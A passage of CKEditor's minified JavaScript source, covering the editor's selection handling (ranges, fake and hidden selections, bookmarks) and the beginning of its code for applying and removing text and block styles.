            return (!n || n.type != CKEDITOR.NODE_ELEMENT && n.type != CKEDITOR.NODE_TEXT || !this.root.equals(n) && !this.root.contains(n)) && (this._.cache.type = CKEDITOR.SELECTION_NONE,
            this._.cache.startElement = null, this._.cache.selectedElement = null, this._.cache.selectedText = "",
            this._.cache.ranges = new CKEDITOR.dom.rangeList()), this;
        };
        var h, f = {
            img: 1,
            hr: 1,
            li: 1,
            table: 1,
            tr: 1,
            td: 1,
            th: 1,
            embed: 1,
            object: 1,
            ol: 1,
            ul: 1,
            a: 1,
            input: 1,
            form: 1,
            select: 1,
            textarea: 1,
            button: 1,
            fieldset: 1,
            thead: 1,
            tfoot: 1
        };
        CKEDITOR.dom.selection.prototype = {
            getNative: function() {
                return void 0 !== this._.cache.nativeSel ? this._.cache.nativeSel : this._.cache.nativeSel = T ? this.document.$.selection : this.document.getWindow().$.getSelection();
            },
            getType: T ? function() {
                var e = this._.cache;
                if (e.type) return e.type;
                var t = CKEDITOR.SELECTION_NONE;
                try {
                    var n = this.getNative(), i = n.type;
                    "Text" == i && (t = CKEDITOR.SELECTION_TEXT), "Control" == i && (t = CKEDITOR.SELECTION_ELEMENT),
                    n.createRange().parentElement() && (t = CKEDITOR.SELECTION_TEXT);
                } catch (e) {}
                return e.type = t;
            } : function() {
                var e = this._.cache;
                if (e.type) return e.type;
                var t = CKEDITOR.SELECTION_TEXT, n = this.getNative();
                if (n && n.rangeCount) {
                    if (1 == n.rangeCount) {
                        var i = (n = n.getRangeAt(0)).startContainer;
                        i == n.endContainer && 1 == i.nodeType && n.endOffset - n.startOffset == 1 && f[i.childNodes[n.startOffset].nodeName.toLowerCase()] && (t = CKEDITOR.SELECTION_ELEMENT);
                    }
                } else t = CKEDITOR.SELECTION_NONE;
                return e.type = t;
            },
            getRanges: (h = T ? function() {
                function h(e) {
                    return new CKEDITOR.dom.node(e).getIndex();
                }
                var s = function(e, t) {
                    (e = e.duplicate()).collapse(t);
                    var n = e.parentElement();
                    if (!n.hasChildNodes()) return {
                        container: n,
                        offset: 0
                    };
                    for (var i, o, a, r, s = n.children, l = e.duplicate(), c = 0, d = s.length - 1, u = -1; c <= d; ) if (i = s[u = Math.floor((c + d) / 2)],
                    l.moveToElementText(i), 0 < (a = l.compareEndPoints("StartToStart", e))) d = u - 1; else {
                        if (!(a < 0)) return {
                            container: n,
                            offset: h(i)
                        };
                        c = u + 1;
                    }
                    if (-1 == u || u == s.length - 1 && a < 0) {
                        if (l.moveToElementText(n), l.setEndPoint("StartToStart", e), l = l.text.replace(/(\r\n|\r)/g, "\n").length,
                        s = n.childNodes, !l) return (i = s[s.length - 1]).nodeType != CKEDITOR.NODE_TEXT ? {
                            container: n,
                            offset: s.length
                        } : {
                            container: i,
                            offset: i.nodeValue.length
                        };
                        for (n = s.length; 0 < l && 0 < n; ) (o = s[--n]).nodeType == CKEDITOR.NODE_TEXT && (l -= (r = o).nodeValue.length);
                        return {
                            container: r,
                            offset: -l
                        };
                    }
                    if (l.collapse(0 < a), l.setEndPoint(0 < a ? "StartToStart" : "EndToStart", e),
                    !(l = l.text.replace(/(\r\n|\r)/g, "\n").length)) return {
                        container: n,
                        offset: h(i) + (0 < a ? 0 : 1)
                    };
                    for (;0 < l; ) try {
                        (o = i[0 < a ? "previousSibling" : "nextSibling"]).nodeType == CKEDITOR.NODE_TEXT && (l -= o.nodeValue.length,
                        r = o), i = o;
                    } catch (e) {
                        return {
                            container: n,
                            offset: h(i)
                        };
                    }
                    return {
                        container: r,
                        offset: 0 < a ? -l : r.nodeValue.length + l
                    };
                };
                return function() {
                    var e = (r = this.getNative()) && r.createRange(), t = this.getType();
                    if (!r) return [];
                    if (t == CKEDITOR.SELECTION_TEXT) return r = new CKEDITOR.dom.range(this.root),
                    t = s(e, !0), r.setStart(new CKEDITOR.dom.node(t.container), t.offset), t = s(e),
                    r.setEnd(new CKEDITOR.dom.node(t.container), t.offset), r.endContainer.getPosition(r.startContainer) & CKEDITOR.POSITION_PRECEDING && r.endOffset <= r.startContainer.getIndex() && r.collapse(),
                    [ r ];
                    if (t == CKEDITOR.SELECTION_ELEMENT) {
                        t = [];
                        for (var n = 0; n < e.length; n++) {
                            for (var i = e.item(n), o = i.parentNode, a = 0, r = new CKEDITOR.dom.range(this.root); a < o.childNodes.length && o.childNodes[a] != i; a++) ;
                            r.setStart(new CKEDITOR.dom.node(o), a), r.setEnd(new CKEDITOR.dom.node(o), a + 1),
                            t.push(r);
                        }
                        return t;
                    }
                    return [];
                };
            }() : function() {
                var e, t = [], n = this.getNative();
                if (!n) return t;
                for (var i = 0; i < n.rangeCount; i++) {
                    var o = n.getRangeAt(i);
                    (e = new CKEDITOR.dom.range(this.root)).setStart(new CKEDITOR.dom.node(o.startContainer), o.startOffset),
                    e.setEnd(new CKEDITOR.dom.node(o.endContainer), o.endOffset), t.push(e);
                }
                return t;
            }, function(e) {
                var t = this._.cache, n = t.ranges;
                return n || (t.ranges = n = new CKEDITOR.dom.rangeList(h.call(this))), e ? function(n) {
                    for (var i = 0; i < n.length; i++) {
                        var o = n[i];
                        if (o.getCommonAncestor().isReadOnly() && n.splice(i, 1), !o.collapsed) {
                            if (o.startContainer.isReadOnly()) for (var e, t = o.startContainer; t && !((e = t.type == CKEDITOR.NODE_ELEMENT) && t.is("body") || !t.isReadOnly()); ) e && "false" == t.getAttribute("contentEditable") && o.setStartAfter(t),
                            t = t.getParent();
                            t = o.startContainer, e = o.endContainer;
                            var a = o.startOffset, r = o.endOffset, s = o.clone();
                            t && t.type == CKEDITOR.NODE_TEXT && (a >= t.getLength() ? s.setStartAfter(t) : s.setStartBefore(t)),
                            e && e.type == CKEDITOR.NODE_TEXT && (r ? s.setEndAfter(e) : s.setEndBefore(e)),
                            (t = new CKEDITOR.dom.walker(s)).evaluator = function(e) {
                                if (e.type == CKEDITOR.NODE_ELEMENT && e.isReadOnly()) {
                                    var t = o.clone();
                                    return o.setEndBefore(e), o.collapsed && n.splice(i--, 1), e.getPosition(s.endContainer) & CKEDITOR.POSITION_CONTAINS || (t.setStartAfter(e),
                                    t.collapsed || n.splice(i + 1, 0, t)), !0;
                                }
                                return !1;
                            }, t.next();
                        }
                    }
                    return n;
                }(new CKEDITOR.dom.rangeList(n.slice())) : n;
            }),
            getStartElement: function() {
                var e, t = this._.cache;
                if (void 0 !== t.startElement) return t.startElement;
                switch (this.getType()) {
                  case CKEDITOR.SELECTION_ELEMENT:
                    return this.getSelectedElement();

                  case CKEDITOR.SELECTION_TEXT:
                    var n = this.getRanges()[0];
                    if (n) {
                        if (n.collapsed) (e = n.startContainer).type != CKEDITOR.NODE_ELEMENT && (e = e.getParent()); else {
                            for (n.optimize(); e = n.startContainer, n.startOffset == (e.getChildCount ? e.getChildCount() : e.getLength()) && !e.isBlockBoundary(); ) n.setStartAfter(e);
                            if ((e = n.startContainer).type != CKEDITOR.NODE_ELEMENT) return e.getParent();
                            if ((e = e.getChild(n.startOffset)) && e.type == CKEDITOR.NODE_ELEMENT) for (n = e.getFirst(); n && n.type == CKEDITOR.NODE_ELEMENT; ) n = (e = n).getFirst(); else e = n.startContainer;
                        }
                        e = e.$;
                    }
                }
                return t.startElement = e ? new CKEDITOR.dom.element(e) : null;
            },
            getSelectedElement: function() {
                var e = this._.cache;
                if (void 0 !== e.selectedElement) return e.selectedElement;
                var o = this, t = CKEDITOR.tools.tryThese(function() {
                    return o.getNative().createRange().item(0);
                }, function() {
                    for (var e, t, n = o.getRanges()[0].clone(), i = 2; i && (!(e = n.getEnclosedNode()) || e.type != CKEDITOR.NODE_ELEMENT || !f[e.getName()] || !(t = e)); i--) n.shrink(CKEDITOR.SHRINK_ELEMENT);
                    return t && t.$;
                });
                return e.selectedElement = t ? new CKEDITOR.dom.element(t) : null;
            },
            getSelectedText: function() {
                var e = this._.cache;
                if (void 0 !== e.selectedText) return e.selectedText;
                var t = this.getNative();
                return t = T ? "Control" == t.type ? "" : t.createRange().text : t.toString(), e.selectedText = t;
            },
            lock: function() {
                this.getRanges(), this.getStartElement(), this.getSelectedElement(), this.getSelectedText(),
                this._.cache.nativeSel = null, this.isLocked = 1;
            },
            unlock: function(e) {
                if (this.isLocked) {
                    if (e) var t = this.getSelectedElement(), n = !t && this.getRanges(), i = this.isFake;
                    this.isLocked = 0, this.reset(), e && (e = t || n[0] && n[0].getCommonAncestor()) && e.getAscendant("body", 1) && (i ? this.fake(t) : t ? this.selectElement(t) : this.selectRanges(n));
                }
            },
            reset: function() {
                this._.cache = {}, this.isFake = 0;
                var e = this.root.editor;
                if (e && e._.fakeSelection && this.rev == e._.fakeSelection.rev) {
                    delete e._.fakeSelection;
                    var t = e._.hiddenSelectionContainer;
                    if (t) {
                        var n = e.checkDirty();
                        e.fire("lockSnapshot"), t.remove(), e.fire("unlockSnapshot"), !n && e.resetDirty();
                    }
                    delete e._.hiddenSelectionContainer;
                }
                this.rev = d++;
            },
            selectElement: function(e) {
                var t = new CKEDITOR.dom.range(this.root);
                t.setStartBefore(e), t.setEndAfter(e), this.selectRanges([ t ]);
            },
            selectRanges: function(e) {
                if (n = (n = this.root.editor) && n._.hiddenSelectionContainer, this.reset(), n) for (var t, n = this.root, i = 0; i < e.length; ++i) (t = e[i]).endContainer.equals(n) && (t.endOffset = Math.min(t.endOffset, n.getChildCount()));
                if (e.length) if (this.isLocked) {
                    var o = CKEDITOR.document.getActive();
                    this.unlock(), this.selectRanges(e), this.lock(), o && !o.equals(this.root) && o.focus();
                } else {
                    var a, r, s;
                    if (1 == e.length && !(s = e[0]).collapsed && (a = s.getEnclosedNode()) && a.type == CKEDITOR.NODE_ELEMENT && ((s = s.clone()).shrink(CKEDITOR.SHRINK_ELEMENT, !0),
                    (r = s.getEnclosedNode()) && r.type == CKEDITOR.NODE_ELEMENT && (a = r), "false" == a.getAttribute("contenteditable")) || (a = void 0),
                    a) this.fake(a); else {
                        if (T) {
                            var l, c, d;
                            if (s = CKEDITOR.dom.walker.whitespaces(!0), r = /\ufeff|\u00a0/, n = {
                                table: 1,
                                tbody: 1,
                                tr: 1
                            }, 1 < e.length && (a = e[e.length - 1], e[0].setEnd(a.endContainer, a.endOffset)),
                            e = (a = e[0]).collapsed, (t = a.getEnclosedNode()) && t.type == CKEDITOR.NODE_ELEMENT && t.getName() in f && (!t.is("a") || !t.getText())) try {
                                return (d = t.$.createControlRange()).addElement(t.$), void d.select();
                            } catch (e) {}
                            (a.startContainer.type == CKEDITOR.NODE_ELEMENT && a.startContainer.getName() in n || a.endContainer.type == CKEDITOR.NODE_ELEMENT && a.endContainer.getName() in n) && (a.shrink(CKEDITOR.NODE_ELEMENT, !0),
                            e = a.collapsed), n = (d = a.createBookmark()).startNode, e || (o = d.endNode),
                            (d = a.document.$.body.createTextRange()).moveToElementText(n.$), d.moveStart("character", 1),
                            o ? ((r = a.document.$.body.createTextRange()).moveToElementText(o.$), d.setEndPoint("EndToEnd", r),
                            d.moveEnd("character", -1)) : (l = n.getNext(s), c = n.hasAscendant("pre"), l = !(l && l.getText && l.getText().match(r)) && (c || !n.hasPrevious() || n.getPrevious().is && n.getPrevious().is("br")),
                            (c = a.document.createElement("span")).setHtml("&#65279;"), c.insertBefore(n), l && a.document.createText("\ufeff").insertBefore(n)),
                            a.setStartBefore(n), n.remove(), e ? (l ? (d.moveStart("character", -1), d.select(),
                            a.document.$.selection.clear()) : d.select(), a.moveToPosition(c, CKEDITOR.POSITION_BEFORE_START),
                            c.remove()) : (a.setEndBefore(o), o.remove(), d.select());
                        } else {
                            if (!(o = this.getNative())) return;
                            for (this.removeAllRanges(), d = 0; d < e.length; d++) if (d < e.length - 1 && (l = e[d],
                            c = e[d + 1], (r = l.clone()).setStart(l.endContainer, l.endOffset), r.setEnd(c.startContainer, c.startOffset),
                            !r.collapsed && (r.shrink(CKEDITOR.NODE_ELEMENT, !0), a = r.getCommonAncestor(),
                            r = r.getEnclosedNode(), a.isReadOnly() || r && r.isReadOnly()))) c.setStart(l.startContainer, l.startOffset),
                            e.splice(d--, 1); else {
                                a = e[d], c = this.document.$.createRange(), a.collapsed && CKEDITOR.env.webkit && u(a) && (p(l = this.root, !1),
                                r = l.getDocument().createText("​"), l.setCustomData("cke-fillingChar", r), a.insertNode(r),
                                (l = r.getNext()) && !r.getPrevious() && l.type == CKEDITOR.NODE_ELEMENT && "br" == l.getName() ? (p(this.root),
                                a.moveToPosition(l, CKEDITOR.POSITION_BEFORE_START)) : a.moveToPosition(r, CKEDITOR.POSITION_AFTER_END)),
                                c.setStart(a.startContainer.$, a.startOffset);
                                try {
                                    c.setEnd(a.endContainer.$, a.endOffset);
                                } catch (e) {
                                    if (!(0 <= e.toString().indexOf("NS_ERROR_ILLEGAL_VALUE"))) throw e;
                                    a.collapse(1), c.setEnd(a.endContainer.$, a.endOffset);
                                }
                                o.addRange(c);
                            }
                        }
                        this.reset(), this.root.fire("selectionchange");
                    }
                }
            },
            fake: function(e) {
                var t = this.root.editor;
                this.reset(), function(e) {
                    var t = CKEDITOR.dom.element.createFromHtml('<div data-cke-hidden-sel="1" data-cke-temp="1" style="' + (CKEDITOR.env.ie ? "display:none" : "position:fixed;top:0;left:-1000px") + '">&nbsp;</div>', e.document);
                    e.fire("lockSnapshot"), e.editable().append(t);
                    var n = e.getSelection(1), i = e.createRange(), o = n.root.on("selectionchange", function(e) {
                        e.cancel();
                    }, null, null, 0);
                    i.setStartAt(t, CKEDITOR.POSITION_AFTER_START), i.setEndAt(t, CKEDITOR.POSITION_BEFORE_END),
                    n.selectRanges([ i ]), o.removeListener(), e.fire("unlockSnapshot"), e._.hiddenSelectionContainer = t;
                }(t);
                var n = this._.cache, i = new CKEDITOR.dom.range(this.root);
                i.setStartBefore(e), i.setEndAfter(e), n.ranges = new CKEDITOR.dom.rangeList(i),
                n.selectedElement = n.startElement = e, n.type = CKEDITOR.SELECTION_ELEMENT, n.selectedText = n.nativeSel = null,
                this.isFake = 1, this.rev = d++, (t._.fakeSelection = this).root.fire("selectionchange");
            },
            isHidden: function() {
                var e = this.getCommonAncestor();
                return e && e.type == CKEDITOR.NODE_TEXT && (e = e.getParent()), !(!e || !e.data("cke-hidden-sel"));
            },
            createBookmarks: function(e) {
                return e = this.getRanges().createBookmarks(e), this.isFake && (e.isFake = 1), e;
            },
            createBookmarks2: function(e) {
                return e = this.getRanges().createBookmarks2(e), this.isFake && (e.isFake = 1),
                e;
            },
            selectBookmarks: function(e) {
                for (var t = [], n = 0; n < e.length; n++) {
                    var i = new CKEDITOR.dom.range(this.root);
                    i.moveToBookmark(e[n]), t.push(i);
                }
                return e.isFake ? this.fake(t[0].getEnclosedNode()) : this.selectRanges(t), this;
            },
            getCommonAncestor: function() {
                var e = this.getRanges();
                return e.length ? e[0].startContainer.getCommonAncestor(e[e.length - 1].endContainer) : null;
            },
            scrollIntoView: function() {
                this.type != CKEDITOR.SELECTION_NONE && this.getRanges()[0].scrollIntoView();
            },
            removeAllRanges: function() {
                if (this.getType() != CKEDITOR.SELECTION_NONE) {
                    var e = this.getNative();
                    try {
                        e && e[T ? "empty" : "removeAllRanges"]();
                    } catch (e) {}
                    this.reset();
                }
            }
        };
    }(), CKEDITOR.STYLE_BLOCK = 1, CKEDITOR.STYLE_INLINE = 2, CKEDITOR.STYLE_OBJECT = 3,
    function() {
        function K(e, t) {
            for (var n, i; (e = e.getParent()) && !e.equals(t); ) if (e.getAttribute("data-nostyle")) n = e; else if (!i) {
                var o = e.getAttribute("contentEditable");
                "false" == o ? n = e : "true" == o && (i = 1);
            }
            return n;
        }
        function y(e) {
            var t = e.document;
            if (e.collapsed) t = N(this, t), e.insertNode(t), e.moveToPosition(t, CKEDITOR.POSITION_BEFORE_END); else {
                var n, i = this.element, o = this._.definition, a = (h = o.ignoreReadonly) || o.includeReadonly;
                null == a && (a = e.root.getCustomData("cke_includeReadonly"));
                var r = CKEDITOR.dtd[i];
                r || (n = !0, r = CKEDITOR.dtd.span), e.enlarge(CKEDITOR.ENLARGE_INLINE, 1), e.trim();
                var s, l = e.createBookmark(), c = l.startNode, d = l.endNode, u = c;
                if (!h) {
                    var h = K(c, f = e.getCommonAncestor()), f = K(d, f);
                    h && (u = h.getNextSourceNode(!0)), f && (d = f);
                }
                for (u.getPosition(d) == CKEDITOR.POSITION_FOLLOWING && (u = 0); u; ) {
                    if (h = !1, u.equals(d)) u = null, h = !0; else {
                        f = (I = u.type == CKEDITOR.NODE_ELEMENT ? u.getName() : null) && "false" == u.getAttribute("contentEditable");
                        var m = I && u.getAttribute("data-nostyle");
                        if (I && u.data("cke-bookmark")) {
                            u = u.getNextSourceNode(!0);
                            continue;
                        }
                        if (f && a && CKEDITOR.dtd.$block[I]) for (var g = void 0, E = 0, p = (b = (v = _(p = u)).length) && new CKEDITOR.dom.range(p.getDocument()); E < b; ++E) {
                            g = v[E];
                            var T = CKEDITOR.filter.instances[g.data("cke-filter")];
                            (!T || T.check(this)) && (p.selectNodeContents(g), y.call(this, p));
                        }
                        if (v = I ? !r[I] || m ? 0 : f && !a ? 0 : (u.getPosition(d) | w) == w && (!o.childRule || o.childRule(u)) : 1) {
                            if (!(v = u.getParent()) || !(v.getDtd() || CKEDITOR.dtd.span)[i] && !n || o.parentRule && !o.parentRule(v)) h = !0; else if (s || I && CKEDITOR.dtd.$removeEmpty[I] && (u.getPosition(d) | w) != w || (s = e.clone()).setStartBefore(u),
                            (I = u.type) == CKEDITOR.NODE_TEXT || f || I == CKEDITOR.NODE_ELEMENT && !u.getChildCount()) {
                                for (var C, I = u; (h = !I.getNext(S)) && r[(C = I.getParent()).getName()] && (C.getPosition(c) | x) == x && (!o.childRule || o.childRule(C)); ) I = C;
                                s.setEndAfter(I);
                            }
                        } else h = !0;
                        u = u.getNextSourceNode(m || f);
                    }
                    if (h && s && !s.collapsed) {
                        f = (h = N(this, t)).hasAttributes(), m = s.getCommonAncestor(), I = {};
                        for (var O, D, R, v = {}, b = (g = {}, {}); h && m; ) {
                            if (m.getName() == i) {
                                for (O in o.attributes) !b[O] && (R = m.getAttribute(D)) && (h.getAttribute(O) == R ? v[O] = 1 : b[O] = 1);
                                for (D in o.styles) !g[D] && (R = m.getStyle(D)) && (h.getStyle(D) == R ? I[D] = 1 : g[D] = 1);
                            }
                            m = m.getParent();
                        }
                        for (O in v) h.removeAttribute(O);
                        for (D in I) h.removeStyle(D);
                        f && !h.hasAttributes() && (h = null), h ? (s.extractContents().appendTo(h), s.insertNode(h),
                        k.call(this, h), h.mergeSiblings(), CKEDITOR.env.ie || h.$.normalize()) : (h = new CKEDITOR.dom.element("span"),
                        s.extractContents().appendTo(h), s.insertNode(h), k.call(this, h), h.remove(!0)),
                        s = null;
                    }
                }
                e.moveToBookmark(l), e.shrink(CKEDITOR.SHRINK_TEXT), e.shrink(CKEDITOR.NODE_ELEMENT, !0);
            }
        }
        function t(e) {
            function t() {
                for (var e = new CKEDITOR.dom.elementPath(r.getParent()), t = new CKEDITOR.dom.elementPath(c.getParent()), n = null, i = null, o = 0; o < e.elements.length; o++) {
                    var a = e.elements[o];
                    if (a == e.block || a == e.blockLimit) break;
                    d.checkElementRemovable(a, !0) && (n = a);
                }
                for (o = 0; o < t.elements.length && (a = t.elements[o]) != t.block && a != t.blockLimit; o++) d.checkElementRemovable(a, !0) && (i = a);
                i && c.breakParent(i), n && r.breakParent(n);
            }
            e.enlarge(CKEDITOR.ENLARGE_INLINE, 1);
            var n = e.createBookmark(), r = n.startNode;
            if (e.collapsed) {
                for (var i, o, a = new CKEDITOR.dom.elementPath(r.getParent(), e.root), s = 0; s < a.elements.length && (o = a.elements[s]) && o != a.block && o != a.blockLimit; s++) if (this.checkElementRemovable(o)) {
                    var l;
                    e.collapsed && (e.checkBoundaryOfElement(o, CKEDITOR.END) || (l = e.checkBoundaryOfElement(o, CKEDITOR.START))) ? (i = o).match = l ? "start" : "end" : (o.mergeSiblings(),
                    o.is(this.element) ? u.call(this, o) : h(o, f(this)[o.getName()]));
                }
                if (i) {
                    for (o = r, s = 0; !(l = a.elements[s]).equals(i); s++) l.match || ((l = l.clone()).append(o),
                    o = l);
                    o["start" == i.match ? "insertBefore" : "insertAfter"](i);
                }
            } else {
                var c = n.endNode, d = this;
                for (t(), a = r; !a.equals(c); ) i = a.getNextSourceNode(), a.type == CKEDITOR.NODE_ELEMENT && this.checkElementRemovable(a) && (a.getName() == this.element ? u.call(this, a) : h(a, f(this)[a.getName()]),
                i.type == CKEDITOR.NODE_ELEMENT && i.contains(r) && (t(), i = r.getNext())), a = i;
            }
            e.moveToBookmark(n), e.shrink(CKEDITOR.NODE_ELEMENT, !0);
        }
        function _(e) {
            var t = [];
            return e.forEach(function(e) {
                if ("true" == e.getAttribute("contenteditable")) return t.push(e), !1;
            }, CKEDITOR.NODE_ELEMENT, !0), t;
        }
        function n(e) {
            var t = e.getEnclosedNode() || e.getCommonAncestor(!1, !0);
            (e = new CKEDITOR.dom.elementPath(t, e.root).contains(this.element, 1)) && !e.isReadOnly() && s(e, this);
        }
        function i(e) {
            var t = e.getCommonAncestor(!0, !0);
            if (e = new CKEDITOR.dom.elementPath(t, e.root).contains(this.element, 1)) {
                var n = (t = this._.definition).attributes;
                if (n) for (var i in n) e.removeAttribute(i, n[i]);
                if (t.styles) for (var o in t.styles) t.styles.hasOwnProperty(o) && e.removeStyle(o);
            }
        }
        function o(e) {
            var t = e.createBookmark(!0), n = e.createIterator();
            n.enforceRealBlocks = !0, this._.enterMode && (n.enlargeBr = this._.enterMode != CKEDITOR.ENTER_BR);
            for (var i, o = e.document; i = n.getNextParagraph(); ) !i.isReadOnly() && (!n.activeFilter || n.activeFilter.check(this)) && r(i, N(this, o, i));
            e.moveToBookmark(t);
        }
        function a(e) {
            var t, n, i = e.createBookmark(1), o = e.createIterator();
            for (o.enforceRealBlocks = !0, o.enlargeBr = this._.enterMode != CKEDITOR.ENTER_BR; t = o.getNextParagraph(); ) this.checkElementRemovable(t) && (t.is("pre") ? ((n = this._.enterMode == CKEDITOR.ENTER_BR ? null : e.document.createElement(this._.enterMode == CKEDITOR.ENTER_P ? "p" : "div")) && t.copyAttributes(n),
            r(t, n)) : u.call(this, t));
            e.moveToBookmark(i);
        }
        function r(e, t) {
            var n = !t;
            n && (t = e.getDocument().createElement("div"), e.copyAttributes(t));
            var i, o, a = t && t.is("pre"), r = e.is("pre"), s = !a && r;
            if (a && !r) {
                if (r = t, (s = e.getBogus()) && s.remove(), s = (s = (s = (s = c(s = e.getHtml(), /(?:^[ \t\n\r]+)|(?:[ \t\n\r]+$)/g, "")).replace(/[ \t\r\n]*(<br[^>]*>)[ \t\r\n]*/gi, "$1")).replace(/([ \t\n\r]+|&nbsp;)/g, " ")).replace(/<br\b[^>]*>/gi, "\n"),
                CKEDITOR.env.ie) {
                    var l = e.getDocument().createElement("div");
                    l.append(r), r.$.outerHTML = "<pre>" + s + "</pre>", r.copyAttributes(l.getFirst()),
                    r = l.getFirst().remove();
                } else r.setHtml(s);
                t = r;
            } else s ? t = function(e, t) {
                var n;
                1 < e.length && (n = new CKEDITOR.dom.documentFragment(t.getDocument()));
                for (var i = 0; i < e.length; i++) {
                    var o = (o = (o = c(o = c(o = c(o = (o = e[i]).replace(/(\r\n|\r)/g, "\n"), /^[ \t]*\n/, ""), /\n$/, ""), /^[ \t]+|[ \t]+$/g, function(e, t) {
                        return 1 == e.length ? "&nbsp;" : t ? " " + CKEDITOR.tools.repeat("&nbsp;", e.length - 1) : CKEDITOR.tools.repeat("&nbsp;", e.length - 1) + " ";
                    })).replace(/\n/g, "<br>")).replace(/[ \t]{2,}/g, function(e) {
                        return CKEDITOR.tools.repeat("&nbsp;", e.length - 1) + " ";
                    });
                    if (n) {
                        var a = t.clone();
                        a.setHtml(o), n.append(a);
                    } else t.setHtml(o);
                }
                return n || t;
            }(n ? [ e.getHtml() ] : (i = [], c(e.getOuterHtml(), /(\S\s*)\n(?:\s|(<span[^>]+data-cke-bookmark.*?\/span>))*\n(?!$)/gi, function(e, t, n) {
                return t + "</pre>" + n + "<pre>";
            }).replace(/<pre\b.*?>([\s\S]*?)<\/pre>/gi, function(e, t) {
                i.push(t);
            }), i), t) : e.moveChildren(t);
            t.replace(e), a ? (o = (n = t).getPrevious(I)) && o.type == CKEDITOR.NODE_ELEMENT && o.is("pre") && (a = c(o.getHtml(), /\n$/, "") + "\n\n" + c(n.getHtml(), /^\n/, ""),
            CKEDITOR.env.ie ? n.$.outerHTML = "<pre>" + a + "</pre>" : n.setHtml(a), o.remove()) : n && d(t);
        }
        function c(e, t, n) {
            var i = "", o = "";
            return e = e.replace(/(^<span[^>]+data-cke-bookmark.*?\/span>)|(<span[^>]+data-cke-bookmark.*?\/span>$)/gi, function(e, t, n) {
                return t && (i = t), n && (o = n), "";
            }), i + e.replace(t, n) + o;
        }
        function u(e, t) {
            var n, i = (o = this._.definition).attributes, o = o.styles, a = f(this)[e.getName()], r = CKEDITOR.tools.isEmpty(i) && CKEDITOR.tools.isEmpty(o);
            for (n in i) ("class" == n || this._.definition.fullMatch) && e.getAttribute(n) != m(n, i[n]) || t && "data-" == n.slice(0, 5) || (r = e.hasAttribute(n),
            e.removeAttribute(n));
            for (var s in o) this._.definition.fullMatch && e.getStyle(s) != m(s, o[s], !0) || (r = r || !!e.getStyle(s),
            e.removeStyle(s));
            h(e, a, E[e.getName()]), r && (this._.definition.alwaysRemoveElement ? d(e, 1) : !CKEDITOR.dtd.$block[e.getName()] || this._.enterMode == CKEDITOR.ENTER_BR && !e.hasAttributes() ? d(e) : e.renameNode(this._.enterMode == CKEDITOR.ENTER_P ? "p" : "div"));
        }
        function k(e) {
            for (var t, n = f(this), i = e.getElementsByTag(this.element), o = i.count(); 0 <= --o; ) (t = i.getItem(o)).isReadOnly() || u.call(this, t, !0);
            for (var a in n) if (a != this.element) for (o = (i = e.getElementsByTag(a)).count() - 1; 0 <= o; o--) (t = i.getItem(o)).isReadOnly() || h(t, n[a]);
        }
        function h(e, t, n) {
            if (t = t && t.attributes) for (var i = 0; i < t.length; i++) {
                var o, a = t[i][0];
                if (o = e.getAttribute(a)) {
                    var r = t[i][1];
                    (null === r || r.test && r.test(o) || "string" == typeof r && o == r) && e.removeAttribute(a);
                }
            }
            n || d(e);
        }
        function d(e, t) {
            if (!e.hasAttributes() || t) if (CKEDITOR.dtd.$block[e.getName()]) {
                var n = e.getPrevious(I), i = e.getNext(I);
                n && (n.type == CKEDITOR.NODE_TEXT || !n.isBlockBoundary({
                    br: 1
                })) && e.append("br", 1), i && (i.type == CKEDITOR.NODE_TEXT || !i.isBlockBoundary({
                    br: 1
                })) && e.append("br"), e.remove(!0);
            } else n = e.getFirst(), i = e.getLast(), e.remove(!0), n && (n.type == CKEDITOR.NODE_ELEMENT && n.mergeSiblings(),
            i && !n.equals(i) && i.type == CKEDITOR.NODE_ELEMENT && i.mergeSiblings());
        }
        function N(e, t, n) {
            var i;
            return "*" == (i = e.element) && (i = "span"), i = new CKEDITOR.dom.element(i, t),
            n && n.copyAttributes(i), i = s(i, e), t.getCustomData("doc_processing_style") && i.hasAttribute("id") ? i.removeAttribute("id") : t.setCustomData("doc_processing_style", 1),
            i;
        }
        function s(e, t) {
            var n = (i = t._.definition).attributes, i = CKEDITOR.style.getStyleText(i);
            if (n) for (var o in n) e.setAttribute(o, n[o]);
            return i && e.setAttribute("style", i), e;
        }
        function l(e, n) {
            for (var t in e) e[t] = e[t].replace(C, function(e, t) {
                return n[t];
            });
        }
        function f(e) {
            if (e._.overrides) return e._.overrides;
            var t = e._.overrides = {}, n = e._.definition.overrides;
            if (n) {
                CKEDITOR.tools.isArray(n) || (n = [ n ]);
                for (var i = 0; i < n.length; i++) {
                    var o, a;
                    if ("string" == typeof (s = n[i]) ? o = s.toLowerCase() : (o = s.element ? s.element.toLowerCase() : e.element,
                    a = s.attributes), s = t[o] || (t[o] = {}), a) {
                        var r, s = s.attributes = s.attributes || [];
                        for (r in a) s.push([ r.toLowerCase(), a[r] ]);
                    }
                }
            }
            return t;
        }
        function m(e, t, n) {
            var i = new CKEDITOR.dom.element("span");
            return i[n ? "setStyle" : "setAttribute"](e, t), i[n ? "getStyle" : "getAttribute"](e);
        }
        function g(e, t, n) {
            for (var i, o = e.document, a = e.getRanges(), r = (t = t ? this.removeFromRange : this.applyToRange,
            a.createIterator()); i = r.getNextRange(); ) t.call(this, i, n);
            e.selectRanges(a), o.removeCustomData("doc_processing_style");
        }
        var E = {
            address: 1,
            div: 1,
            h1: 1,
            h2: 1,
            h3: 1,
            h4: 1,
            h5: 1,
            h6: 1,
            p: 1,
            pre: 1,
            section: 1,
            header: 1,
            footer: 1,
            nav: 1,
            article: 1,
            aside: 1,
            figure: 1,
            dialog: 1,
            hgroup: 1,
            time: 1,
            meter: 1,
            menu: 1,
            command: 1,
            keygen: 1,
            output: 1,
            progress: 1,
            details: 1,
            datagrid: 1,
            datalist: 1
        }, p = {
            a: 1,
            blockquote: 1,
            embed: 1,
            hr: 1,
            img: 1,
            li: 1,
            object: 1,
            ol: 1,
            table: 1,
            td: 1,
            tr: 1,
            th: 1,
            ul: 1,
            dl: 1,
            dt: 1,
            dd: 1,
            form: 1,
            audio: 1,
            video: 1
        }, T = /\s*(?:;\s*|$)/, C = /#\((.+?)\)/g, S = CKEDITOR.dom.walker.bookmark(0, 1), I = CKEDITOR.dom.walker.whitespaces(1);
        CKEDITOR.style = function(e, t) {
            if ("string" == typeof e.type) return new CKEDITOR.style.customHandlers[e.type](e);
            var n = e.attributes;
            n && n.style && (e.styles = CKEDITOR.tools.extend({}, e.styles, CKEDITOR.tools.parseCssText(n.style)),
            delete n.style), t && (l((e = CKEDITOR.tools.clone(e)).attributes, t), l(e.styles, t)),
